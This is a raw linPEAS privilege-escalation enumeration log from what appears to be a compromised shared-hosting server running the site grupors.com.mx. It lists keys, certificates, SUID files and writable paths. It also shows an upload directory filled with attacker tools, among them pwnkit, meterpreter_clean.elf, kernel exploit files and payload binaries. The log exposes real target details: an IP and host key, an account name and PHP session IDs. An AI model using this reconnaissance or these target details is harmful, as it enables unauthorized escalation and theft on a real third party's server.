[185.232.14.103]:65002 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK04YCy5DbPRyRR7iV5U7SLpOfGhDg4K8fOrGd/iw520hyLLP88Ou10AFbdwnyOy8i37UVjSQuN7QFebb9s+oPo=


-rw-r--r-- 1 u311353020 o50030915 123 Oct  2  2023 /home/u311353020/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHk5xcYDR+HNWUUJol4e7+zQTHdEltNuImC5bhXCYdPD u311353020@sg-nme-web265.main-hosting.eu

-rw-r--r-- 1 root 89939 426 Nov 30  2023 /opt/gsutil/third_party/google-auth-library-python/tests/data/privatekey.pub


══╣ Possible private SSH keys were found!
/home/u311353020/domains/grupors.com.mx/public_html/ventas/libraries/google-api-php-client/src/Google/Signer/P12.php
/home/u311353020/domains/grupors.com.mx/public_html/ventas/libraries/tcpdf/tcpdf.pem
/home/u311353020/domains/grupors.com.mx/public_html/ventas/libraries/tcpdf/tcpdf.crt
/home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/meterpreter_clean.elf

══╣ Some certificates were found (out limited):
/etc/pki/ca-trust/source/anchors/hostinger-ca.crt
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pki/fwupd/LVFS-CA.pem
/etc/pki/tls/certs/hostinger.crt
/home/u311353020/domains/grupors.com.mx/public_html/ventas/libraries/tcpdf/tcpdf.crt
/home/u311353020/domains/grupors.com.mx/public_html/ventas/libraries/tcpdf/tcpdf.pem
/opt/HPEMRSA/LSIStorageAuthority/server/conf/Sample_SSL_https/ssl.crt
/opt/alt/python37/lib/python3.7/site-packages/future/backports/test/badcert.pem
/opt/alt/python37/lib/python3.7/site-packages/future/backports/test/badkey.pem
/opt/alt/python37/lib/python3.7/site-packages/future/backports/test/https_svn_python_org_root.pem
/opt/alt/python37/lib/python3.7/site-packages/future/backports/test/keycert.passwd.pem
/opt/alt/python37/lib/python3.7/site-packages/future/backports/test/keycert.pem
/opt/alt/python37/lib/python3.7/site-packages/future/backports/test/keycert2.pem
/opt/alt/python37/lib/python3.7/site-packages/future/backports/test/nullcert.pem
/opt/alt/python37/lib/python3.7/site-packages/future/backports/test/sha256.pem
/opt/alt/python37/lib/python3.7/site-packages/future/backports/test/ssl_cert.pem
/opt/alt/python37/lib/python3.7/site-packages/future/backports/test/ssl_key.passwd.pem
/opt/alt/python37/lib/python3.7/site-packages/future/backports/test/ssl_key.pem
/opt/alt/tests/alt-php84-pecl-http_4.2.6-2.el8/tests/helper/http2.crt
/opt/alt/tests/alt-php84-pecl-oauth_2.0.7-4.el8/tests/test.pem
1378156PSTORAGE_CERTSBIN

══╣ Some client certificates were found:
/home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/_samples/adobeair/sample01_cert.pfx
/home/u311353020/domains/grupors.com.mx/public_html/ventas/libraries/tcpdf/tcpdf.p12
/opt/go/pkg/mod/github.com/go-openapi/runtime@v0.25.0/fixtures/certs/myclient.p12
/opt/gsutil/gslib/tests/test_data/test.p12
/opt/gsutil/third_party/google-auth-library-python/tests/data/privatekey.p12


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf




                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strace Not Found
-r-sr-xr-x 1 root root 79K Apr  2  2024 /usr/local/lsws/bin/lscgid.6.2.1 (Unknown SUID binary!)
-r-sr-xr-x 1 root root 207K Sep 12  2024 /usr/local/lsws/bin/lscgid.6.3 (Unknown SUID binary!)
-r-sr-xr-x 1 root root 67K Nov 13  2023 /usr/local/lsws/bin/lscgid.6.1.2 (Unknown SUID binary!)
-r-sr-xr-x 1 root root 67K Mar 24  2022 /usr/local/lsws/bin/lscgid.6.0.11 (Unknown SUID binary!)
-r-sr-xr-x 1 root root 67K Aug  9  2023 /usr/local/lsws/bin/lscgid.6.1.1 (Unknown SUID binary!)
-r-sr-xr-x 1 root root 241K Mar 21 09:19 /usr/local/lsws/bin/lscgid.6.3.2 (Unknown SUID binary!)
-r-sr-xr-x 1 root root 79K Mar  6  2024 /usr/local/lsws/bin/lscgid.6.2 (Unknown SUID binary!)
-rwsr-xr-x 1 root root 17K Apr  1  2023 /lib/polkit-1/polkit-agent-helper-1
You own the SUID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/exploit
You own the SUID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/payload_exec
You own the SUID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/pwnkit
You own the SUID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/exp22555
You own the SUID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/e.sh
You own the SUID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/xxxx.php
You own the SUID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/ptrace_traceme_root
You own the SUID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/55555.elf
You own the SUID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/exploit.sh
You own the SUID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/linpeas.sh
You own the SUID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/memexec
You own the SUID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/payload_exec.c
You own the SUID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/exp.c

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
You own the SGID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/exploit
You own the SGID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/payload_exec
You own the SGID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/pwnkit
You own the SGID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/exp22555
You own the SGID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/e.sh
You own the SGID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/xxxx.php
You own the SGID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/ptrace_traceme_root
You own the SGID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/55555.elf
You own the SGID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/exploit.sh
You own the SGID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/linpeas.sh
You own the SGID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/memexec
You own the SGID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/payload_exec.c
You own the SGID file: /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/exp.c

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls
files with acls in searched folders Not Found

╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities
══╣ Current shell capabilities
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000

══╣ Parent proc capabilities
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000


Files with capabilities (limited to 50):

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso
/etc/ld.so.conf
Content of /etc/ld.so.conf:
include ld.so.conf.d/*.conf
ld.so.conf.d
  ld.so.conf.d/*
cat: 'ld.so.conf.d/*': No such file or directory

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files
total 136
drwxr-xr-x  2 root root 4096 Mar 26 19:37 .
drwxr-xr-x 30 root root 4096 Mar 26 19:37 ..
-rw-r--r--  1 root root  664 Oct 11  2019 bash_completion.sh
-rw-r--r--  1 root root  196 Aug 12  2018 colorgrep.csh
-rw-r--r--  1 root root  201 Aug 12  2018 colorgrep.sh
-rw-r--r--  1 root root 1741 Apr  1  2023 colorls.csh
-rw-r--r--  1 root root 1606 Apr  1  2023 colorls.sh
-rw-r--r--  1 root root   69 Oct 15  2023 colorsysstat.csh
-rw-r--r--  1 root root   56 Oct 15  2023 colorsysstat.sh
-rw-r--r--  1 root root  162 Jun 14  2022 colorxzgrep.csh
-rw-r--r--  1 root root  183 Jun 14  2022 colorxzgrep.sh
-rw-r--r--  1 root root  216 Apr 20  2022 colorzgrep.csh
-rw-r--r--  1 root root  220 Apr 20  2022 colorzgrep.sh
-rw-r--r--  1 root root  175 Aug 10  2023 crontab.sh
-rw-r--r--  1 root root   80 May 15  2023 csh.local
-rw-r--r--  1 root root  674 Oct 14  2023 debuginfod.csh
-rw-r--r--  1 root root  596 Oct 14  2023 debuginfod.sh
-rw-r--r--  1 root root 1107 Dec 14  2017 gawk.csh
-rw-r--r--  1 root root  757 Dec 14  2017 gawk.sh
-rw-r--r--  1 root root  138 Aug 12  2024 golang.sh
-rw-r--r--  1 root root 2489 May 15  2023 lang.csh
-rw-r--r--  1 root root 2312 May 15  2023 lang.sh
-rw-r--r--  1 root root  500 Aug 12  2018 less.csh
-rw-r--r--  1 root root  253 Aug 12  2018 less.sh
-rw-r--r--  1 root root   49 Oct 18  2019 mc.csh
-rw-r--r--  1 root root  153 Oct 18  2019 mc.sh
lrwxrwxrwx  1 root root   29 Mar 26 19:37 modules.csh -> /etc/alternatives/modules.csh
lrwxrwxrwx  1 root root   28 Mar 26 19:37 modules.sh -> /etc/alternatives/modules.sh
-rw-r--r--  1 root root  284 Aug 25  2017 scl-init.csh
-rw-r--r--  1 root root  637 Aug 25  2017 scl-init.sh
-rw-r--r--  1 root root   81 May 15  2023 sh.local
-rw-r--r--  1 root root  106 Aug  2  2022 vim.csh
-rw-r--r--  1 root root  248 Aug  2  2022 vim.sh
-rw-r--r--  1 root root  120 Oct 15  2023 which2.csh
-rw-r--r--  1 root root  540 Oct 15  2023 which2.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/.dbdumps
/var/www
/var/www/html
/var/www/html/.aaa.html
/var/www/html/.aaa.ini
/var/www/html/.aaa.log
/var/www/html/.aaa.pdf

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
/dev/shm
/etc/cl.php.d
/etc/cl.php.d/alt-php52
/etc/cl.php.d/alt-php52/alt_php.ini
/etc/cl.php.d/alt-php53
/etc/cl.php.d/alt-php53/alt_php.ini
/etc/cl.php.d/alt-php54
/etc/cl.php.d/alt-php54/alt_php.ini
/etc/cl.php.d/alt-php55
/etc/cl.php.d/alt-php55/alt_php.ini
/etc/cl.php.d/alt-php56
/etc/cl.php.d/alt-php56/alt_php.ini
/etc/cl.php.d/alt-php70
/etc/cl.php.d/alt-php70/alt_php.ini
/etc/cl.php.d/alt-php71
/etc/cl.php.d/alt-php71/alt_php.ini
/etc/cl.php.d/alt-php72
/etc/cl.php.d/alt-php72/alt_php.ini
/etc/cl.php.d/alt-php73
/etc/cl.php.d/alt-php73/alt_php.ini
/etc/cl.php.d/alt-php74
/etc/cl.php.d/alt-php74/alt_php.ini
/etc/cl.php.d/alt-php80
/etc/cl.php.d/alt-php80/alt_php.ini
/etc/cl.php.d/alt-php81
/etc/cl.php.d/alt-php81/alt_php.ini
/etc/cl.php.d/alt-php82
/etc/cl.php.d/alt-php82/alt_php.ini
/etc/cl.php.d/alt-php83
/etc/cl.php.d/alt-php83/alt_php.ini
/etc/cl.php.d/alt-php84
/etc/cl.php.d/alt-php84/alt_php.ini
/etc/cl.selector
/home/.dbdumps/u311353020
/home/u311353020
/opt/alt/php52/link
/opt/alt/php52/var/lib/php/session
/opt/alt/php53/link
/opt/alt/php53/var/lib/php/session
/opt/alt/php54/link
/opt/alt/php54/var/lib/php/session
/opt/alt/php55/link
/opt/alt/php55/var/lib/php/session
/opt/alt/php56/link
/opt/alt/php56/var/lib/php/session
/opt/alt/php56/var/lib/php/session/sess_00rrm42k8tkmedkqunho8531k0
/opt/alt/php56/var/lib/php/session/sess_01ankb4kmg54cprcb1u3hatu22
/opt/alt/php56/var/lib/php/session/sess_03c8qjggvkj52diajo3prcj2n6
/opt/alt/php56/var/lib/php/session/sess_04ch1fgcigij7s1rapt1t1bji4
/opt/alt/php56/var/lib/php/session/sess_05hvlkqlnrn30mecrvnb4lro95
#)You_can_write_even_more_files_inside_last_directory

/opt/alt/php70/link
/opt/alt/php70/var/lib/php/session
/opt/alt/php71/link
/opt/alt/php71/var/lib/php/session
/opt/alt/php72/link
/opt/alt/php72/var/lib/php/session
/opt/alt/php73/link
/opt/alt/php73/var/lib/php/session
/opt/alt/php74/link
/opt/alt/php74/var/lib/php/session
/opt/alt/php80/link
/opt/alt/php80/var/lib/php/session
/opt/alt/php81/link
/opt/alt/php81/var/lib/php/session
/opt/alt/php82/link
/opt/alt/php82/var/lib/php/session
/opt/alt/php83/link
/opt/alt/php83/var/lib/php/session
/opt/alt/php84/link
/opt/alt/php84/var/lib/php/session
/run/cagefs
/run/cagefs/utmp
/run/screen
/tmp
/tmp/linpeas.log
/tmp/linpeas_basic.log
/tmp/passwd
/tmp/passwd.bak
/tmp/pwnkit
/var/.cagefs/.cagefs.token
/var/cache/php-eaccelerator
/var/log/alt-php52-newrelic
/var/log/alt-php53-newrelic
/var/log/alt-php54-newrelic
/var/log/alt-php55-newrelic
/var/log/alt-php56-newrelic
#)You_can_write_even_more_files_inside_last_directory

/var/php/apm/db
/var/spool/cron

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
  Group o50030915:
/var/php/apm/db
/var/cache/php-eaccelerator
/run/screen
/tmp/pwnkit



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
/usr/bin/lesspipe.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2025-04-21+00:23:24.2832330800 /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/2/2/linpeas.sh
2025-04-20+22:32:18.8286204310 /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/2/2/pwnkit_exec
2025-04-20+22:06:21.4923140860 /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/2/memexec
2025-04-20+20:53:49.5791262360 /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/System1
2025-04-20+20:44:09.5518693800 /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/linpeas.sh
2025-04-20+20:38:18.3051545770 /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/meterpreter_clean.elf
2025-04-20+20:32:29.8373139690 /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/1_xor.elf
2025-04-20+19:38:01.4447192820 /usr/sbin/sendmail
2025-04-20+14:27:13.9541032860 /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/test/gconv-modules
2025-04-20+10:40:24.5067878790 /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/memexec
2025-04-20+10:40:22.6108160900 /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/exp22555
2025-04-20+10:38:07.9698225930 /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/exp.c
2025-04-20+10:37:42.2972062590 /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/e.sh
2025-04-20+10:02:05.0522718280 /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/55555.elf
2025-04-20+09:48:08.4549316550 /home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/xxxx.php
2025-03-21+09:19:17.3426866540 /usr/local/lsws/lsrecaptcha/_recaptcha
2025-03-21+09:19:17.0966903190 /usr/local/lsws/modules.6.3.2/modpagespeed.so
2025-03-21+09:19:17.0556909300 /usr/local/lsws/bin/lscgid.6.3.2
2025-03-21+09:19:17.0456910790 /usr/local/lsws/bin/lshttpd.6.3.2
2025-03-21+09:19:17.0256913770 /usr/local/lsws/bin/lswsctrl.6.3.2
2025-03-21+09:19:17.0216914360 /usr/local/lsws/bin/wswatch.sh
2025-03-21+09:19:16.9906918980 /usr/local/lsws/admin/html.6.3.2/static/images/icons/debug.gif
2025-03-21+09:19:16.9146930300 /usr/local/lsws/admin/misc/chroot.sh
2025-03-21+09:19:16.8946933280 /usr/local/lsws/admin/misc/purge_cache_by_url
2025-03-21+09:19:16.8896934030 /usr/local/lsws/admin/misc/cpanel_restart_httpd.in
2025-03-21+09:19:16.8866934470 /usr/local/lsws/admin/misc/build_ap_wrapper.sh
2025-03-21+09:19:16.8816935220 /usr/local/lsws/admin/misc/ap_lsws.sh.in
2025-03-21+09:19:16.8706936850 /usr/local/lsws/admin/misc/cp_switch_ws.sh
2025-03-21+09:19:16.8666937450 /usr/local/lsws/admin/misc/fix_cagefs.sh
2025-03-21+09:19:16.8616938200 /usr/local/lsws/admin/misc/lsup6.sh
2025-03-21+09:19:16.8576938790 /usr/local/lsws/admin/misc/cleanlitemage.sh
2025-03-21+09:19:16.8536939390 /usr/local/lsws/admin/misc/cleancache.sh
2025-03-21+09:19:16.8496939990 /usr/local/lsws/admin/misc/update.sh
2025-03-21+09:19:16.8446940730 /usr/local/lsws/admin/misc/awstats_install.sh
2025-03-21+09:19:16.8406941320 /usr/local/lsws/admin/misc/create_admin_keypair.sh
2025-03-21+09:19:16.8356942070 /usr/local/lsws/admin/misc/fp_install.sh
2025-03-21+09:19:16.8316942670 /usr/local/lsws/admin/misc/gzipStatic.sh
2025-03-21+09:19:16.8276943260 /usr/local/lsws/admin/misc/mgr_ver.sh
2025-03-21+09:19:16.8226944010 /usr/local/lsws/admin/misc/enable_ruby_python_selector.sh
2025-03-21+09:19:16.8176944750 /usr/local/lsws/admin/misc/lsws.rc.gentoo
2025-03-21+09:19:16.8126945500 /usr/local/lsws/admin/misc/lshttpd.service
2025-03-21+09:19:16.8086946090 /usr/local/lsws/admin/misc/lsws.rc
2025-03-21+09:19:16.8046946690 /usr/local/lsws/admin/misc/uninstall.sh
2025-03-21+09:19:16.7996947430 /usr/local/lsws/admin/misc/rc-uninst.sh
2025-03-21+09:19:16.7956948030 /usr/local/lsws/admin/misc/admpass.sh
2025-03-21+09:19:16.7916948630 /usr/local/lsws/admin/misc/rc-inst.sh
2025-03-21+09:19:16.7866949370 /usr/local/lsws/lsns/bin/lshostexec
2025-03-21+09:19:16.7836949820 /usr/local/lsws/lsns/bin/lssetup
2025-03-21+09:19:16.7786950560 /usr/local/lsws/lsns/bin/cmd_ns
2025-03-21+09:19:16.7746951160 /usr/local/lsws/lsns/bin/unmount_ns
2025-03-21+09:19:16.7706951750 /usr/local/lsws/lsns/bin/lsnsctl
2025-03-21+09:19:16.7666952350 /usr/local/lsws/lsns/bin/lspkgctl
2025-03-21+09:19:16.7626952950 /usr/local/lsws/lsns/bin/lscgstats
2025-03-21+09:19:16.7586953540 /usr/local/lsws/lsns/bin/lscgctl
2025-03-21+09:19:16.7546954140 /usr/local/lsws/lsns/bin/common.py
2025-03-21+09:19:16.7486955030 /usr/local/lsws/admin/fcgi-bin/admin_php5
2025-03-21+09:19:16.7386956520 /usr/local/lsws/fcgi-bin/lswsgi_wrapper
2025-03-21+09:19:16.7336957260 /usr/local/lsws/fcgi-bin/lsnodesm.js
2025-03-21+09:19:16.7296957860 /usr/local/lsws/fcgi-bin/lsnode.js
2025-03-21+09:19:16.7266958310 /usr/local/lsws/fcgi-bin/RailsRunner.rb.2.3
2025-03-21+09:19:16.7216959050 /usr/local/lsws/fcgi-bin/RailsRunner.rb
2025-03-21+09:19:16.7176959650 /usr/local/lsws/fcgi-bin/RackRunner.rb
2025-03-21+09:19:16.7116960540 /usr/local/lsws/add-ons/modsec/inspectmulti.sh
2025-03-21+09:19:16.6956962930 /usr/local/lsws/add-ons/rrdgraph/rrdgraph_install.sh
2025-03-21+09:19:16.6926963370 /usr/local/lsws/add-ons/cpanel/lsws_whm_plugin/lsws_whm_plugin_install.sh
2024-09-12+14:42:47.2429025020 /usr/local/lsws/modules.6.3/modpagespeed.so
2024-09-12+14:42:47.2059030750 /usr/local/lsws/bin/lscgid.6.3
2024-09-12+14:42:47.1979031990 /usr/local/lsws/bin/lshttpd.6.3
2024-09-12+14:42:47.1809034620 /usr/local/lsws/bin/lswsctrl.6.3
2024-09-12+14:42:47.1459040040 /usr/local/lsws/admin/html.6.3/static/images/icons/debug.gif

╔══════════╣ Unexpected in /opt (usually empty)
total 116
drwxr-xr-x 29 root  root  4096 Feb 10 15:42 .
drwxr-xr-x 13 root  root  4096 Apr 20 19:37 ..
drwxr-xr-x  3 root  root  4096 Mar 20  2024 .wp-cli
drwxr-xr-x  3 root  root  4096 Aug 29  2023 HPEMRSA
drwxr-xr-x  2 root  root  4096 Aug  9  2023 MegaRAID
drwxr-xr-x 64 root  root  4096 Feb  6 12:22 alt
drwxr-xr-x  2 root  root  4096 Aug  9  2023 app-version-detector
drwx------  3 root  root  4096 Jan 23 10:25 benchmark
drwxr-xr-x  3 root  root  4096 Aug  9  2023 bitninja-ssl-termination
drwxr-xr-x 20 root  root  4096 Apr 20 23:25 cloudlinux
drwxr-xr-x  2 root  root  4096 Aug  4  2023 cloudlinux-linksafe
drwxr-xr-x  2 root  root  4096 Mar  6  2024 cloudlinux-site-optimization-module
drwxr-xr-x  3 root  root  4096 Jul  9  2024 clwpos
drwxr-xr-x 13 root  root  4096 Aug 10  2023 cpanel
drwxr-xr-x  3 root  root  4096 Aug  9  2023 cpvendor
drwxr-xr-x  3 root  root  4096 Apr  1 10:30 fluent-bit
-rw-r--r--  1 root  root     0 Apr 24  2024 frr_install_done
drwxr-xr-x  4 root  root  4096 Aug  9  2023 go
drwxr-xr-x  4 root  root  4096 Aug 12  2024 golang
drwxr-xr-x  5 root  89939 4096 Feb 11 08:35 gsutil
drwxr-xr-x  3 root  root  4096 Aug 29  2023 hp
drwx------ 21 root  root  4096 Mar 25 10:44 hs3
drwxr-xr-x  6 65537  1004 4096 Mar 25 09:44 ipmi_exporter
drwxr-xr-x  2 root  root  4096 Aug 20  2024 liblve
drwx--x---  5 65542  1010 4096 Aug  9  2023 memcached_exporter
drwxr-xr-x  3 root  root  4096 Aug  4  2023 plesk
drwxr-xr-x  2 root  root  4096 Jul  4  2024 remi
drwxr-xr-x  5 root  root  4096 Mar 29  2024 restic
drwxr-xr-x 27   984   398 4096 Sep 24  2024 sentinelone
drwxr-xr-x  8 root  root  4096 Aug 29  2023 sut

╔══════════╣ Unexpected in root

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/cache/hostinger-wp-cli-packages/.git/FETCH_HEAD
/opt/HPEMRSA/LSIStorageAuthority/logs/lsa.txt
/opt/sut/4_1_0_0/CSystemInventory.json
/opt/sut/4_1_0_0/CSUTSettingsData.json
/opt/sut/4_1_0_0/CSUTData.json
/opt/alt/php56/var/lib/php/session/sess_66ee6i1gtbi5nrgcfbdvtudds3
/opt/alt/php56/var/lib/php/session/sess_tfpt88qjtl8jodvp850dab8ui4
/opt/alt/php56/var/lib/php/session/sess_nim5540sl8dnra9ka7hg6m0gm5
/opt/alt/php56/var/lib/php/session/sess_r9emjandepckn5420ahtplle57
/opt/alt/php56/var/lib/php/session/sess_1q5bp5ith2s4n66rinm2c4m9o5
/opt/alt/php56/var/lib/php/session/sess_d5gn7gve2rojblvjfn0vk3g3d5
/opt/alt/php56/var/lib/php/session/sess_l08p5trp024ghor6o8ss9e7c96
/opt/alt/php56/var/lib/php/session/sess_98jtl15677flbak03n7c8s9aj0
/opt/alt/php56/var/lib/php/session/sess_q9084s8lckgp5taiirksqeo3a2
/opt/alt/php56/var/lib/php/session/sess_cr14fvg1bc0glueu9ubml2udp7
/opt/alt/php56/var/lib/php/session/sess_uu9c6i8e55icrhtrp477ndhb33
/opt/alt/php56/var/lib/php/session/sess_84c139pnlct8nqg5m52p1k09l1
/opt/alt/php56/var/lib/php/session/sess_n633ti868cjmlhao00jbvsdr26
/opt/alt/php56/var/lib/php/session/sess_s8s6geu7pi5vqcldrrfur71284
/opt/alt/php56/var/lib/php/session/sess_sn4gkf3o5v7ppaqsc7d7uattr6
/opt/alt/php56/var/lib/php/session/sess_r14h5a15b6344t178scgordsq3
/opt/alt/php56/var/lib/php/session/sess_n8vk66deoe1d268gdjrpn2o4v1
/opt/alt/php56/var/lib/php/session/sess_ij4145akv95vvnh1c35pej3nj4
/opt/alt/php56/var/lib/php/session/sess_t7g480vv4igd2u6pe6fphajdq3
/opt/alt/php56/var/lib/php/session/sess_f9qmqicuf9sg4lqa8dgkcgrpa1
/opt/alt/php56/var/lib/php/session/sess_ahmbjgp4u9j7c54fmfiubqkd00
/opt/cloudlinux/litespeed_status
/home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/2/2/2/pwnkit
/home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/2/2/2/run
/home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/2/2/2/payload_root.bin
/home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/2/2/2/memexec
/home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/2/2/payload_root.bin
/home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/2/2/memexec
/home/u311353020/domains/grupors.com.mx/public_html/library/upload-file/php/uploads/1/2/payload.bin
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_66ee6i1gtbi5nrgcfbdvtudds3
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_tfpt88qjtl8jodvp850dab8ui4
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_nim5540sl8dnra9ka7hg6m0gm5
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_r9emjandepckn5420ahtplle57
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_1q5bp5ith2s4n66rinm2c4m9o5
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_d5gn7gve2rojblvjfn0vk3g3d5
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_l08p5trp024ghor6o8ss9e7c96
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_98jtl15677flbak03n7c8s9aj0
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_q9084s8lckgp5taiirksqeo3a2
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_cr14fvg1bc0glueu9ubml2udp7
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_uu9c6i8e55icrhtrp477ndhb33
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_84c139pnlct8nqg5m52p1k09l1
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_n633ti868cjmlhao00jbvsdr26
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_s8s6geu7pi5vqcldrrfur71284
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_sn4gkf3o5v7ppaqsc7d7uattr6
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_r14h5a15b6344t178scgordsq3
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_n8vk66deoe1d268gdjrpn2o4v1
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_ij4145akv95vvnh1c35pej3nj4
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_t7g480vv4igd2u6pe6fphajdq3
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_f9qmqicuf9sg4lqa8dgkcgrpa1
/home/u311353020/.cagefs/opt/alt/php56/var/lib/php/session/sess_ahmbjgp4u9j7c54fmfiubqkd00
/home/u311353020/.cagefs/tmp/4sKNFu.gif
/home/u311353020/.cagefs/tmp/p7HqAH.gif
/home/u311353020/.cagefs/tmp/gQCADL.gif
